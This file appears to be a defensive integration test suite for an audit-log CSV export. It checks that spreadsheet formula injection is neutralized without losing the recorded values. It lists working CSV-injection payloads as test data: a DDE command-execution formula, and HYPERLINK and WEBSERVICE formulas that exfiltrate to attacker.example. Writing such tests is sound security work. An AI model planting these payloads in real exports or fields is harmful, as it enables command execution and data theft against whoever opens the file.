"""Audit exports must not carry spreadsheet-active content (AUDIT-030 / R11, T003 RED).

``audit.to_csv`` writes every cell raw (``audit.py``: ``";".join(v) if isinstance(v, list) else v``),
so a value the attacker controls — a query text, a topic slug, a principal id, a trace id — reaches
the file exactly as stored. Opened in Excel, LibreOffice or Sheets, a cell starting with ``=``,
``+``, ``-``, ``@`` or a leading tab/CR is evaluated as a formula: ``=cmd|' /c calc'!A0`` executes,
``=HYPERLINK(...)`` and ``=WEBSERVICE(...)`` exfiltrate the row to an attacker-controlled URL. The
export endpoint is reachable by every authorized reader, so the payload travels from whoever wrote it
to whoever opens the export.

The ratified outcome (AUDIT-030 acceptance): *no formula, link, command, or external request is
activated and the literal value remains safely recoverable*. Both halves matter — neutralizing by
deleting the value would satisfy the first and fail the second, and an audit log that quietly alters
what it recorded is not an audit log.

Bounded export (``limit``) is covered by the same criterion's second bullet and is owned by T005's
boundary work; this file is the neutralization half.
"""

from __future__ import annotations

import csv
import io
import uuid
from collections.abc import Callable
from pathlib import Path

import httpx
import pytest

from rsc_brain import audit as audit_mod
from rsc_brain.api.app import ApiDeps, create_app
from rsc_brain.identity.service import IdentityService
from rsc_brain.stores.relational import models
from rsc_brain.stores.relational.store import PgRelationalStore
from tests.integration.conftest import Harness, unique_slug

pytestmark = pytest.mark.integration

#: The prefixes common spreadsheet software treats as the start of an expression.
ACTIVE_PREFIXES = ("=", "+", "-", "@")

#: Payloads a real attacker uses, each one a value the product will happily store today.
PAYLOADS = (
    "=cmd|' /c calc'!A0",  # command execution via DDE
    '=HYPERLINK("https://attacker.example/?x=1","click")',  # exfiltration by click
    '=WEBSERVICE("https://attacker.example/?leak=1")',  # exfiltration with no click at all
    "+1+1",
    "-1+1",
    "@SUM(1+1)",
    "\t=1+1",  # a leading tab still leaves the '=' first in the parsed cell
    "\r=1+1",
)


def _client(harness: Harness, tmp_path: Path) -> httpx.AsyncClient:
    app = create_app(
        deps=ApiDeps(sessionmaker=harness.sm, gateway=harness.gateway, data_dir=str(tmp_path))
    )
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test")


async def _admin_pat(harness: Harness, project_id: str, *, topics: tuple[str, ...]) -> str:
    user = (
        await PgRelationalStore(harness.sm)
        .users()
        .create_user(email=f"{unique_slug('u')}@example.com", status="active", role="member")
    )
    identity = IdentityService(harness.sm)
    membership = await identity.add_membership(
        user.user_id, project_id, role="project-admin", allowed_topics=topics
    )
    return (await identity.issue_pat(membership)).token


async def _seed_row(harness: Harness, project_id: str, **fields: object) -> None:
    async with harness.sm() as session:
        session.add(
            models.AuditLog(
                project_id=uuid.UUID(project_id),
                principal_type="human",
                principal_id="seed",
                action="recall",
                topics_used=["general"],
                denied=False,
                **fields,
            )
        )
        await session.commit()


def _is_neutralized(cell: str) -> bool:
    """A cell is safe when a spreadsheet will not start parsing it as an expression.

    Any encoding that achieves it is acceptable — a leading apostrophe, a leading space, a wrapping
    that makes the first character inert. What is NOT acceptable is the raw active prefix, including
    one hidden behind leading whitespace, which spreadsheets skip before deciding.
    """
    stripped = cell.lstrip("\t\r\n ")
    return not stripped.startswith(ACTIVE_PREFIXES)


def _recoverable(cell: str, payload: str) -> bool:
    """The literal value must still be readable by a human inspecting the export.

    Neutralization may add a prefix or escape; it may not silently drop or rewrite the recorded
    characters, because then the export would misreport what the audit log actually holds.
    """
    meaningful = payload.lstrip("\t\r\n ")
    return meaningful in cell


@pytest.mark.parametrize("payload", PAYLOADS, ids=[repr(p) for p in PAYLOADS])
async def test_a_spreadsheet_active_query_text_is_neutralized_in_the_export(
    payload: str, build_harness: Callable[..., Harness], tmp_path: Path
) -> None:
    """The end-to-end path: an attacker-controlled query text reaches the CSV a reader opens."""
    harness = build_harness()
    project = await harness.setup_project(unique_slug("acme"), [("general", 0)])
    await _seed_row(harness, project, query_text=payload)
    token = await _admin_pat(harness, project, topics=("general",))

    async with _client(harness, tmp_path) as client:
        response = await client.get(
            "/api/v1/admin/audit/export", headers={"Authorization": f"Bearer {token}"}
        )

    assert response.status_code == 200, response.text
    rows = list(csv.DictReader(io.StringIO(response.text)))
    assert rows, "the export produced no rows, so it proves nothing"
    cells = [row["query_text"] or "" for row in rows]
    active = [c for c in cells if not _is_neutralized(c)]
    assert not active, (
        f"the export carries a live spreadsheet expression: {active!r} — opening it runs the payload"
    )
    assert any(_recoverable(c, payload) for c in cells), (
        f"the literal value {payload!r} is no longer recoverable from the export: {cells!r}"
    )


@pytest.mark.parametrize("field", ["principal_id", "action", "tool", "trace_id"])
async def test_every_attacker_reachable_column_is_neutralized(
    field: str, build_harness: Callable[..., Harness], tmp_path: Path
) -> None:
    """Not just the query text: any column whose value comes from a caller can carry the payload.

    ``trace_id`` arrives in a request header, ``principal_id`` and ``tool`` are recorded from the
    caller's own identity/tooling, and ``action`` is composed from caller-supplied signal names.
    """
    harness = build_harness()
    project = await harness.setup_project(unique_slug("acme"), [("general", 0)])
    payload = '=HYPERLINK("https://attacker.example","x")'
    await _seed_row(harness, project, **{field: payload})
    token = await _admin_pat(harness, project, topics=("general",))

    async with _client(harness, tmp_path) as client:
        response = await client.get(
            "/api/v1/admin/audit/export", headers={"Authorization": f"Bearer {token}"}
        )

    assert response.status_code == 200, response.text
    rows = list(csv.DictReader(io.StringIO(response.text)))
    cells = [row[field] or "" for row in rows]
    active = [c for c in cells if not _is_neutralized(c)]
    assert not active, f"{field} carries a live spreadsheet expression: {active!r}"


async def test_a_topic_slug_cannot_smuggle_a_formula_through_the_joined_cell(
    build_harness: Callable[..., Harness], tmp_path: Path
) -> None:
    """``topics_used`` is joined with ';' into one cell, so the FIRST element decides the cell.

    A project administrator names topics, so this is the path where someone with legitimate
    configuration authority plants a payload for whoever exports the log later.
    """
    harness = build_harness()
    project = await harness.setup_project(unique_slug("acme"), [("general", 0)])
    payload = '=WEBSERVICE("https://attacker.example/?leak=1")'
    await _seed_row(harness, project, topics_used=[payload, "general"])
    token = await _admin_pat(harness, project, topics=(payload, "general"))

    async with _client(harness, tmp_path) as client:
        response = await client.get(
            "/api/v1/admin/audit/export", headers={"Authorization": f"Bearer {token}"}
        )

    assert response.status_code == 200, response.text
    rows = list(csv.DictReader(io.StringIO(response.text)))
    cells = [row["topics_used"] or "" for row in rows]
    active = [c for c in cells if not _is_neutralized(c)]
    assert not active, f"a topic slug smuggled a live expression into the export: {active!r}"


def test_control_characters_do_not_break_the_row_structure() -> None:
    """A unit-level check on the writer itself: control characters must not forge rows or columns.

    An embedded CR/LF or a NUL either has to be escaped or removed; what it must not do is end the
    record early, which would let one audit entry impersonate several and hide what follows.
    """
    rows: list[dict[str, object]] = [
        {
            "id": 1,
            "action": "recall\r\ninjected,forged",
            "principal_id": "u\x001",
            "topics_used": ["general"],
        }
    ]
    exported = audit_mod.to_csv(rows)
    parsed = list(csv.DictReader(io.StringIO(exported)))
    assert len(parsed) == 1, (
        f"one audit row became {len(parsed)} records — an embedded newline forged rows: {exported!r}"
    )
    assert "\x00" not in exported, "a NUL byte reached the export"
